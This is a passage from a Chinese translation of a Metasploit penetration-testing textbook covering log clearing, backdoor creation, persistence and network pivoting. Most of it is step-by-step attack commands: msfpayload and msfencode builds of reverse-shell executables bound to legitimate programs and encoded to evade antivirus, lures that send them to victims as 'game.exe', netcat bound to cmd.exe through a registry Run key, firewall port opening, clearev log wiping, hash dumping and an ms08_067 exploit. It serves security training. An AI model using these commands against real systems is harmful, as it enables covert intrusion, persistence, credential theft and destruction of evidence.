![杀毒软件杀死和日志删除](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_28.jpg)

图片来源：[`paddle-static.s3.amazonaws.com/HR/CleanMyPC-BDJ/CleanMyPC-icon.png`](https://paddle-static.s3.amazonaws.com/HR/CleanMyPC-BDJ/CleanMyPC-icon.png)

成功禁用防火墙和杀毒软件后，我们要做的最后一件事就是清理计算机系统中的所有日志等证据。首先，我们将使用事件查看器在受害者系统中检查是否创建了任何日志。

![杀毒软件杀死和日志删除](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_29.jpg)

我们可以在上一个截图中看到有三个日志，分为**应用程序**，**安全**和**系统**。在**应用程序**部分，我们可以看到有 118 个事件被创建。现在我们必须清除所有这些日志。为了清理日志，我们将使用 Meterpreter 命令`clearev`，它将从受害者系统中清除所有日志。因此输入`clearev`。

![杀毒软件杀死和日志删除](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_30.jpg)

执行命令后，我们可以在上一个截图中看到结果-已删除了 118 个应用程序记录和 467 个系统记录。让我们在受害者系统中使用事件查看器确认一下。

![杀毒软件杀死和日志删除](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_31.jpg)

我们可以看到所有日志已成功从受害者系统中删除。

# 总结

在本章中，我们学习了使用简单的 Meterpreter 脚本清除我们的痕迹并避免被管理员抓住的策略。由于防火墙和杀毒软件是对抗攻击者攻击向量的主要防御手段，攻击者非常重视这些事情。我们还学习了多种禁用系统防火墙和受害者防御的技术。我们按照攻击者的方式，并且成功地清除了我们的痕迹，安全地侵入了系统。因此，到目前为止，我们已经涵盖了渗透测试的第二阶段，这是渗透过程中最重要的阶段之一。在下一章中，我们将介绍与后门合作的技术，并在受害者系统上设置后门以保持永久访问。

# 参考资料

以下是一些有用的参考资料，进一步阐明了本章涉及的一些主题：

+   [`en.wikipedia.org/wiki/Firewall_(computing)`](http://en.wikipedia.org/wiki/Firewall_(computing))

+   [`pentestlab.wordpress.com/2012/04/06/post-exploitation-disable-firewall-and-kill-antivirus/`](http://pentestlab.wordpress.com/2012/04/06/post-exploitation-disable-firewall-and-kill-antivirus/)

+   [`www.securitytube.net/video/2666`](http://www.securitytube.net/video/2666)


# 第十章：后期利用-后门

在上一章中，我们专注于清理我们的足迹，以避免被发现和抓住。本章将涵盖使用后门技术来保持对被攻击系统的访问。后门在维持对系统的持久访问和根据攻击者的需求使用系统方面发挥着重要作用，而无需一次又一次地对其进行攻击。我们将讨论如何规避恶意可执行文件被杀毒软件扫描器检测到并妥协用户机器。此外，我们还将讨论如何使用编码器使这些可执行文件无法被检测到。

# 什么是后门？

后门是一种通过绕过正常的安全机制来获取对计算机的访问权限的手段。随着技术的发展，它现在配备了远程管理实用程序，允许攻击者通过互联网远程控制系统。这可以是绕过身份验证、获取机密信息和非法访问计算机系统的形式。趋势表明，这些更多地集中在下载/上传文件、远程截屏、运行键盘记录器、收集系统信息和侵犯用户隐私方面。

举个例子，考虑一个客户端-服务器网络通信，被攻击的机器充当服务器，客户端是我们的攻击者。一旦在受损的用户上启动服务器应用程序，它就开始监听传入的连接。因此，客户端可以轻松连接到特定端口并开始通信。一旦通信开始，可能会跟随其他恶意活动，如前面所述。我们在服务器和客户端之间建立了一种反向连接。服务器连接到单个客户端，客户端可以向连接的多个服务器发送单个命令。

## 有效载荷工具

在本章中，我们可能会遇到几种有效载荷制作工具。它们在这里简要描述：

+   `msfpayload`：这是 Metasploit 的命令行实例，用于生成和输出 Metasploit 中所有各种类型的 shell 代码。这主要用于生成 Metasploit 中未找到的利用或在最终确定模块之前测试不同类型的 shell 代码和选项。它是不同选项和变量的绝妙混合。

+   `msfencode`：这是 Metasploit 工具包中用于利用开发的另一个很好的工具。它的主要用途是对`msfpayload`生成的 shell 代码进行编码。这是为了适应目标以便正常运行。它可能涉及将 shell 代码转换为纯字母数字，并摆脱坏字符并对 64 位目标进行编码。它可以用于多次编码 shell 代码；以各种格式输出，如 C、Perl 和 Ruby；甚至将其合并到现有的可执行文件中。

+   `msfvenom`：从技术上讲，`msfvenom`是`msfpayload`和`msfencode`的组合。`msfvenom`的优势包括一些标准化的命令行选项、一个单一的工具和增加的速度。

# 创建一个 EXE 后门

在本节中，我们将学习如何使用内置有效载荷创建一个恶意后门。但在开始之前，我们将检查 Metasploit 框架中这些有效载荷的位置（有效载荷目录）。因此，我们转到根目录，然后转到`/opt/metasploit/msf3/modules`。在这个目录下，我们找到**有效载荷**目录。

![创建一个 EXE 后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_01.jpg)

我们还可以通过使用一个简单的命令从 msfconsole 中查看所有这些有效载荷。只需输入`show payloads`，它就会列出所有有效载荷。

![创建一个 EXE 后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_02.jpg)

为了使用有效载荷创建后门，Metasploit 中有三种可用工具，`msfpayload`、`msfencode`和`msfvenom`。这三个工具位于`/opt/metasploit/msf3`。

![创建 EXE 后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_03.jpg)

现在我们将看到如何使用`msfpayload`创建后门。打开终端并输入路径到`msfpayload`目录。在我们的情况下，它是`cd /opt/metasploit/msf3`。

![创建 EXE 后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_04.jpg)

现在我们在目录中，我们可以使用`msfpayload`来创建一个后门；也就是说，`msfpayload`的位置。输入`./msfpayload -h`将显示`msfpayload`的所有可用命令。

![创建 EXE 后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_05.jpg)

我们看到有一个`<payload>`选项。这意味着我们首先必须从有效载荷列表中选择一个有效载荷，这已经由`show payloads`命令向您显示。所以我们现在选择一个有效载荷。

![创建 EXE 后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_06.jpg)

例如，在这里，我们选择`windows/x64/meterpreter/reverse_tcp`有效载荷来创建我们的后门。

现在输入`./msfpayload windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.105 X> root/Desktop/virus.exe`。

要使用的语法如下：

```
PAYLOAD NAME - windows/x64/meterpreter/reverse_tcp LHOST(your local IP address) - 192.168.0.105 X> (Giving path directory where to create virus.exe backdoor)- root/Desktop/virus.exe

```

![创建 EXE 后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_07.jpg)

输入命令后，我们看到我们的桌面上有一个`virus.exe`后门。就是这样；我们完成了。使用`msfpayload`创建后门是如此简单。如果我们不想创建自己的 EXE 文件，只想与另一个 EXE 文件绑定（可能是软件安装文件），我们可以使用`msfpayload`和`msfvenom`的混合。

现在我们将把我们的后门 EXE 文件与`putty.exe`文件绑定。非常小心地输入以下命令：

```
./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.0.105 R | msfencode -e x86/shikata_ga_nai -c 6 -t exe -x/root/Desktop/putty.exe -o /root/Desktop/virusputty.exe

```

要使用的语法如下：

```
PAYLOAD NAME - windows/x64/meterpreter/reverse_tcp LHOST(your local IP address) - 192.168.0.105 ENCODER NAME - x86/shikata_ga_nai c(The number of times to encode the data) - 6 t(The format to display the encoded buffer) - exe x (Specify an alternate win32 executable template)- root/Desktop/virus.exe o(The output file) - root/Desktop/virusputty.exe

```

我们可以在以下截图中看到我们的病毒文件`virus.exe`已经与`putty.exe`绑定，给我们`virusputty.exe`，它可以在我们的桌面上使用。

![创建 EXE 后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_08.jpg)

到目前为止，在本章中，我们已经学会了使用`msfpayload`和`msfvenom`创建后门。下一步是使用任何社会工程技术将这个后门 EXE 程序发送给受害者。

## 创建一个完全不可检测的后门

我们在前一节中创建的后门效率不高，缺乏检测逃避机制。问题在于后门很容易被杀毒程序检测到。因此，在本节中，我们的主要任务将是制作一个不可检测的后门并绕过杀毒程序。

我们刚刚将我们的`virus.exe`文件发送给受害者，将其更改为`game.exe`的名称，以便他/她下载。

![创建一个完全不可检测的后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_09.jpg)

下载`game.exe`文件后，它被 AVG 杀毒软件检测为病毒。

![创建一个完全不可检测的后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_10.jpg)

我们的后门很容易被杀毒程序检测到，我们必须使其不可检测。让我们开始这个过程。我们将使用`msfencode`和编码器来做到这一点。首先，选择一个用于编码后门 EXE 文件的良好编码器。输入`show encoders`；这将显示 Metasploit 中可用编码器的列表。

![创建一个完全不可检测的后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_11.jpg)

我们现在可以看到编码器列表。我们将选择`x86 shikata_ga_nai`，因为它的排名是**excellent**。

![创建一个完全不可检测的后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_12.jpg)

现在输入以下命令：

```
./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.0.105 R | msfencode -e x86/shikata_ga_nai -c 1 -t exe -x/root/Desktop/game.exe -o /root/Desktop/supergame.exe

```

要使用的语法如下：

```
PAYLOAD NAME - windows/meterpreter/reverse_tcp LHOST(your local IP address) - 192.168.0.105 ENCODER NAME - x86/shikata_ga_nai c(The number of times to encode the data) - 1 t(The format to display the encoded buffer) - exe x (Specify an alternate win32 executable template) - root/Desktop/game.exe o(The output file) - root/Desktop/supergame.exe

```

我们可以在以下截图中看到我们的`supergame.exe`文件已经创建。

![创建一个完全不可检测的后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_13.jpg)

再次，我们以链接的形式将`supergame.exe`文件发送给受害者，并让他/她将`supergame.exe`文件下载到他/她的桌面上。

![创建一个完全不可检测的后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_14.jpg)

如果受害者使用杀毒程序扫描`supergame.exe`文件，他/她会发现它是一个干净的文件。

![创建一个完全不可检测的后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_15.jpg)

如果你不喜欢在终端中输入这么多命令，还有另一种简单的方法可以借助脚本创建一个不可检测的后门。这个脚本叫做 Vanish。在处理脚本之前，我们必须在 BackTrack（BackTrack 是一个基于 Debian GNU/Linux 发行版的发行版，旨在进行数字取证和渗透测试）中安装一些 Vanish 脚本所需的软件包。因此，键入`apt-get install mingw32-runtime mingw-w64 mingw gcc-mingw32 mingw32-binutils`。安装所有必要的软件包需要几分钟的时间。

![创建一个完全不可检测的后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_16.jpg)

成功安装软件包后，我们只需通过键入`wget http://samsclass.info/120/proj/vanish.sh`从互联网上下载脚本；`vanish.sh`文件保存在桌面上。

![创建一个完全不可检测的后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_17.jpg)

之后，键入`ll van*`。

![创建一个完全不可检测的后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_18.jpg)

现在通过键入`chmod a+x vanish.sh`来更改脚本的权限。

![创建一个完全不可检测的后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_19.jpg)

之后，我们必须将位于 Metasploit 目录中的 Vanish 脚本移动到`pentest/exploits/framework2`。

![创建一个完全不可检测的后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_20.jpg)

我们的 Vanish 脚本现在已经准备好使用了，所以让我们进入该目录并键入`sh vanish.sh`。

![创建一个完全不可检测的后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_21.jpg)

执行脚本后，脚本将要求我们要在哪个网络接口上使用它。键入`eth0`。

![创建一个完全不可检测的后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_22.jpg)

提供设备接口后，它会要求提供一些更多的选项，比如它将监听的反向连接的端口号（`4444`），一个随机种子号（我们输入为`2278`），以及对载荷进行编码的次数（我们指定为`2`）。在提供了这些细节之后，它将在`seclabs`目录中创建一个`backdoor.exe`文件。`seclabs`目录位于与 Vanish 脚本相同的目录中。脚本还将自动在 msfconsole 中启动载荷处理程序。现在我们只需要将`backdoor.exe`文件发送给受害者，并等待其执行。

![创建一个完全不可检测的后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_23.jpg)

到目前为止，我们已经学习了创建后门的不同方法和技巧。现在我们将进入下一部分 - 在执行后门后处理来自受害者计算机的反向连接。将载荷发送给受害者后，打开 msfconsole 并键入`use exploit/multi/handler`。

![创建一个完全不可检测的后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_24.jpg)

然后只需在此处理程序中设置所有载荷细节并将其发送给受害者。例如，键入`set PAYLOAD <your payload name>`；在这里，我们使用`set PAYLOAD windows/meterpreter/reverse_tcp`。

![创建一个完全不可检测的后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_25.jpg)

之后，设置您为后门 EXE 文件提供的本地主机地址。例如，键入`set LHOST <IP 地址>`；在这里，我们使用`set LHOST 192.168.0.103`。

![创建一个完全不可检测的后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_26.jpg)

这是利用利用技术进行攻击的最后一种类型，我们将看到我们的反向处理程序连接已准备好接收连接。

![创建一个完全不可检测的后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_27.jpg)

执行后门后，反向连接将成功建立，并且在攻击者的系统上将生成一个 Meterpreter 会话。

![创建一个完全不可检测的后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_28.jpg)

让我们通过检查受害者的系统属性来获取有关受害者系统的信息。

![创建一个完全不可检测的后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_29.jpg)

现在是时候学习一些不同的东西了。在本节中，我们将学习在获得 Meterpreter 会话后在受害者系统中安装后门。

Metasploit 中还有另一个后门，称为`metsvc`。我们将首先检查可以与此后门一起使用的命令，因此输入`run metsvc -h`，它将向我们显示这些命令。

![创建一个完全不可检测的后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_30.jpg)

我们可以看到`-A`选项将自动在受害者的机器上启动后门。因此输入`run metsvc -A`。

![创建一个完全不可检测的后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_31.jpg)

我们可以看到第二个 Meterpreter 会话从受害者的系统建立，并且恶意后门`metsvc-server.exe`文件已成功上传到受害者的系统并执行。

![创建一个完全不可检测的后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_32.jpg)

受害者的任务管理器显示我们的后门服务正在运行。这些恶意文件被上传到 Windows 的`Temp`目录下的`C:\WINDOWS\Temp\CFcREntszFKx`。

![创建一个完全不可检测的后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_33.jpg)

如果要从受害者的系统中删除该后门服务，请输入`run metsvc -r`。

![创建一个完全不可检测的后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_34.jpg)

我们可以看到`metsvc`服务已成功删除，但受害者的`Temp`目录中的 EXE 文件不会被删除。

## Metasploit 持久后门

在这部分，我们将学习使用持久后门。这是一个在目标系统中安装后门服务的 Meterpreter 脚本。因此输入`run persistence -h`以显示可以与持久后门一起使用的所有命令。

![Metasploit 持久后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_35.jpg)

在了解可用命令之后，输入`run persistence -A -L C:\\ -S -X -p 445 -i 10 -r 192.168.0.103`。

此语法中的命令解释如下：

+   `A`：自动启动 payload 处理程序

+   `L`：在目标主机上放置 payload 的位置

+   `S`：在系统启动时自动启动代理

+   `p`：用于监听反向连接的端口号

+   `i`：新连接的时间间隔

+   `r`：目标机器的 IP 地址

现在我们运行我们的持久后门脚本，如下截图所示：

![Metasploit 持久后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_36.jpg)

我们看到从受害者的系统建立了一个 Meterpreter 会话。让我们验证一下 payload 是否被放在了受害者的`C:`驱动器中。

![Metasploit 持久后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_37.jpg)

如果要删除该 payload，我们必须输入`resource`和在运行`persistence`命令时创建的文件的路径。我们可以在上一步中找到路径。输入`resource /root/.msf4/logs/persistence/PWNED-02526E037_20130513.2452/PWNED-02526E037_20130513.2452.rc`。

![Metasploit 持久后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_38.jpg)

我们将向您展示另一个著名的持久后门 Netcat。我们将通过 Meterpreter 会话将 Netcat 上传到受害者的系统上。就像在以下截图中一样，我们将在桌面上看到`nc.exe`文件；那个文件就是 Netcat。现在我们将把这个`nc.exe`文件上传到受害者的`system32`文件夹中。因此输入`upload /root/Desktop/nc.exe C:\\windows\\system32`。

![Metasploit 持久后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_39.jpg)

我们可以看到我们的 Netcat 程序已成功上传到受害者的系统。现在我们必须做的一件重要的事情是将 Netcat 添加到受害者的启动过程中，并将其绑定到端口 445。为了能够做到这一点，我们必须调整受害者的注册表设置。输入`run reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run`。

![Metasploit 持久后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_40.jpg)

运行此命令枚举了启动注册表键，并且我们发现启动过程中有三个服务正在运行。我们可以在前面的屏幕截图中看到这三个值。现在我们将我们的 Netcat 服务设置在这个注册表值中。输入`reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe'`。

![Metasploit 持久后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_41.jpg)

我们的 Netcat 服务附加到注册表，所以让我们验证它是否正常运行。输入`reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc`。

![Metasploit 持久后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_42.jpg)

接下来我们要做的重要事情是允许 Netcat 服务通过受害者的防火墙的 445 端口。输入`netsh firewall add portopening TCP 445 "Service Firewall" ENABLE ALL`。

![Metasploit 持久后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_43.jpg)

执行上述命令后，我们看到我们的端口似乎是打开的。因此，让我们从防火墙设置中验证端口是否打开。输入`netsh firewall show portopening`。

![Metasploit 持久后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_44.jpg)

我们可以清楚地看到在前面的屏幕截图中，`445 TCP`端口在防火墙中是启用的。现在重新启动受害者的系统，并使用 Netcat 连接受害者的系统。打开终端，输入`nc -v <targetIP > <netcat port no.>`；例如，这里我们使用`nc -v 192.168.0.107 445`。这样做将使您重新连接到受害者的计算机。

![Metasploit 持久后门](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_10_45.jpg)

# 摘要

在本章中，我们介绍了各种技术，以便在受害者系统上部署可执行的后门。我们学会了将可执行文件绑定到合法程序，并让受害者执行它们，以便我们获得反向连接。我们还讨论了 Metasploit kitty 中不同类型的有效载荷以及它们在建立与后门 EXE 的连接中的工作方式。我们还致力于使可执行文件无法被杀毒软件检测到，因此用户无法区分正常文件和恶意文件。通过这些技术，我们学会了如何在系统被利用后保持对系统的持久访问。在下一章中，我们将讨论后期利用的最后阶段，即枢纽和网络嗅探。

# 参考资料

以下是一些有用的参考资料，可以进一步阐明本章涉及的一些主题：

+   [`jameslovecomputers.wordpress.com/2012/12/10/metasploit-how-to-backdoor-an-exe-file-with-msfpayload/`](http://jameslovecomputers.wordpress.com/2012/12/10/%E2%80%A8metasploit-how-to-backdoor-an-exe-file-with-msfpayload/)

+   [`pentestlab.wordpress.com/2012/04/16/creating-an-undetectable-backdoor/`](http://pentestlab.wordpress.com/2012/04/16/creating-an-undetectable-backdoor/)

+   [`www.securitylabs.in/2011/12/easy-bypass-av-and-firewall.html`](http://www.securitylabs.in/2011/12/easy-bypass-av-and-firewall.html)

+   [`www.offensive-security.com/metasploit-unleashed/Interacting_With_Metsvc`](http://www.offensive-security.com/metasploit-unleashed/Interacting_With_Metsvc)

+   [`www.offensive-security.com/metasploit-unleashed/Netcat_Backdoor`](http://www.offensive-security.com/metasploit-unleashed/%E2%80%A8Netcat_Backdoor)

+   [`en.wikipedia.org/wiki/Backdoor_(computing)`](http://en.wikipedia.org/wiki/Backdoor_(computing))

+   [`www.f-secure.com/v-descs/backdoor.shtml`](http://www.f-secure.com/v-descs/backdoor.shtml)

+   [`feky.bizhat.com/tuts/backdoor.htm`](http://feky.bizhat.com/tuts/backdoor.htm)

+   [`www.offensive-security.com/metasploit-unleashed/Msfpayload`](http://www.offensive-security.com/metasploit-unleashed/Msfpayload)

+   [`www.offensive-security.com/metasploit-unleashed/Msfencode`](http://www.offensive-security.com/metasploit-unleashed/Msfencode)

+   [`www.offensive-security.com/metasploit-unleashed/Msfvenom`](http://www.offensive-security.com/metasploit-unleashed/Msfvenom)


# 第十一章：后期利用-枢轴和网络嗅探

# 什么是枢轴？

简单来说，枢轴取决于一个元素来利用另一个元素。在本章中，我们将探讨枢轴和网络嗅探的艺术。这种情况更适用于终端系统防火墙，或者可能是 Web 服务器，它们是进入内部网络的唯一点。我们将利用 Web 服务器与内部网络的连接，通过前几章中介绍的我们的利用技术连接到内部系统。简而言之，第一个被攻陷的系统帮助我们攻陷其他无法从外部网络访问的系统。

![什么是枢轴？](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_01.jpg)

# 在网络中的枢轴

这是 Metasploit 非常有趣的部分，我们将通过攻陷系统来入侵局域网。在这里，我们已经有了一个被攻陷的系统，并且我们有该系统的`meterpreter` shell。

1.  首先让我们通过输入`ipconfig`来检查该系统的 IP 设置。我们可以在截图中看到受害者有两个网络适配器。`适配器＃2`的 IP 范围为`10.10.10.1`。![在网络中的枢轴](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_02.jpg)

1.  现在我们将通过输入`route`命令来检查整个网络路由表。![在网络中的枢轴](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_03.jpg)

1.  现在我们的计划是攻击这个额外的网络。对于这次攻击，Metasploit 有一个后期利用脚本，称为`autoroute`。这个脚本允许我们使用第一个被攻陷的系统攻击第二个网络。使用这个脚本，我们可以从这个被攻陷的系统攻击第二个网络。输入`run autoroute -h`，它将显示脚本的所有用法命令。![在网络中的枢轴](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_04.jpg)

1.  在这里，我们使用`run autoroute -s 10.10.10.1/24`；运行此命令将从我们的被攻陷系统向目标机器添加一条路由。![在网络中的枢轴](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_05.jpg)

1.  现在，我们可以在前面的截图中看到通过`192.168.0.110`添加了一条路由，这是我们的被攻陷系统。现在我们将验证我们的路由是否已添加，输入`run auroroute -p`。![在网络中的枢轴](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_06.jpg)

1.  我们可以在截图中看到我们的路由已成功添加到路由表中。接下来我们要做的是提升被攻陷系统的权限。为此，我们输入`getsystem`。![在网络中的枢轴](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_07.jpg)

1.  提升了被攻陷系统的权限后，我们现在可以转储所有用户的哈希并获取他们的密码。为此，我们输入`run hashdump`。![在网络中的枢轴](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_08.jpg)

1.  成功转储凭证后，我们将通过按下*Ctrl* + *Z*然后按*Y*将我们的`meterpreter`进程放到后台。![在网络中的枢轴](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_09.jpg)

1.  接下来要做的是扫描第二个网络地址，检查其他系统是否在线，还要检查开放的端口。因此，我们使用辅助模块进行 TCP 端口扫描。为此，我们输入`use auxiliary/scanner/portscan/tcp`。![在网络中的枢轴](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_10.jpg)

1.  现在输入`show options`，它将显示该模块可用的所有选项。![在网络中的枢轴](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_11.jpg)

1.  现在我们将在`RHOST`选项中设置我们的目标地址范围。因此，输入`set rhosts <target IP range>`；例如，在这里我们使用`set rhosts 10.10.10.1/24`。![在网络中的枢轴](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_12.jpg)

1.  接下来，设置我们要查找的端口号。在这里，我们正在寻找计算机系统中发现的最常见的开放端口。因此，输入`set ports <port number>`；例如，在这里我们输入`set ports 139,445`。![在网络中的枢轴](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_13.jpg)

1.  接下来，我们将设置用于扫描 TCP 端口的并发线程数。因此，我们通过输入`set threads 50`来设置 50 个线程。![在网络中转](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_14.jpg)

1.  现在我们的辅助模块已经完全加载用于扫描。我们将要执行的最后一个命令是`run`命令。因此，输入`run`。

我们可以在前面的截图中看到，我们的辅助 TCP 模块扫描器已经启动，并发现两台在线系统的 IP 为 10.10.10.1 和 10.10.10.2，并且还发现该系统上有两个开放端口 139 和 445。这里 IP 10.10.10.1 已经受到影响，所以我们的目标是 IP 10.10.10.2。

![在网络中转](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_15.jpg)

![在网络中转](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_16.jpg)

设置目标 IP 后，现在设置用于攻击目标系统的有效载荷。这次我们使用`windows/meterpreter/bind_tcp`有效载荷进行攻击。因此输入`set payload windows/meterpreter/bind_tcp`。

![在网络中转](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_17.jpg)

现在一切都准备就绪进行攻击，因此输入致命的`exploit`命令。

![在网络中转](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_18.jpg)

在触发`exploit`命令后，我们可以看到`meterpreter`会话 2 已在 IP 10.10.10.2 上打开。我们已经从受影响的系统获得了会话 1；通过受影响的系统，我们能够在网络中攻击另一个系统。

现在让我们检查系统，看看我们是否已经攻击了正确的系统，通过检查其属性。因此输入`sysinfo`。

![在网络中转](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_19.jpg)

我们可以在截图中看到系统的名称是**PWNED**，所以现在我们将验证这个名称。

![在网络中转](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_20.jpg)

# 现在我们将使用一个利用来攻击另一个系统。我们将要使用的利用已经在第三章中使用过，*利用基础*；所以我们非常了解使用这个利用的过程。现在让我们开始；输入`use exploit/windows/smb/ms08_067_netapi`并按*Enter*。然后输入`set rhost <目标 IP>`；例如，这里我们使用`set rhost 10.10.10.2`。

在转向网络之后，我们现在转向另一个主题，学习如何使用`meterpreter`后渗透脚本在网络中进行嗅探。在使用嗅探器之前，我们必须在`meterpreter`会话中加载嗅探器扩展。因此，输入`use sniffer`。

![在网络中嗅探](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_11_21.jpg)

